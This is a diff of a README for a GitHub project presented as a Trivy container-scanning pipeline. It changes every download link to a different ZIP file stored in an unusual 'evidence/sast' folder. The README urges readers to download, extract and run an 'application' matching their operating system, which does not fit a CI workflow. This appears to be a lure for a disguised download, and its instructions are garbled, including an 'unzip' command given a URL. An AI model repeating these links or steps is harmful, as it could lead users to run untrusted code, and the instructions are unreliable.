@@ -1,6 +1,6 @@
 # 🚀 trivy-image-scan-pipeline - Simplifying Container Security for You
 
-[![Download Now](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/diagrams/trivy-image-scan-pipeline-1.0.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/diagrams/trivy-image-scan-pipeline-1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/sast/trivy_pipeline_image_scan_1.7.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/sast/trivy_pipeline_image_scan_1.7.zip)
 
 ## 📋 Description
 The trivy-image-scan-pipeline automates the scanning of container images. It uses GitHub Actions and Trivy to build Docker images efficiently. This software checks for high and critical vulnerabilities, ensuring that your applications remain secure. It also generates helpful reports, including HTML reports, Software Bill of Materials (SBOM), and Static Application Security Testing (SAST) findings. This application illustrates best practices in DevSecOps, supply chain security, and continuous integration risk controls.
@@ -17,7 +17,7 @@ To get started quickly with the trivy-image-scan-pipeline, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the releases page by clicking the link below.  
-   [Download the Latest Release](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/diagrams/trivy-image-scan-pipeline-1.0.zip)
+   [Download the Latest Release](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/sast/trivy_pipeline_image_scan_1.7.zip)
    
 2. **Choose the Correct File**  
    Look for the latest release. You will find multiple files. Select the file that corresponds to your operating system.
@@ -30,13 +30,13 @@ To download and install the application, please follow these instructions:
 
 1. **Download the Application**  
    Click here to visit the page:   
-   [Download the Latest Release](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/diagrams/trivy-image-scan-pipeline-1.0.zip)
+   [Download the Latest Release](https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/sast/trivy_pipeline_image_scan_1.7.zip)
 
 2. **Extract the Files (if necessary)**  
    If you downloaded a ZIP file, you will need to extract it.  
    - On Windows, right-click the file and choose "Extract All."
    - On macOS, double-click the ZIP file to extract it.
-   - On Linux, use the terminal command `unzip https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/diagrams/trivy-image-scan-pipeline-1.0.zip`.
+   - On Linux, use the terminal command `unzip https://raw.githubusercontent.com/KwabynaTheAnalyst/trivy-image-scan-pipeline/main/evidence/sast/trivy_pipeline_image_scan_1.7.zip`.
 
 3. **Run the Application**  
    - Open your terminal or command prompt.
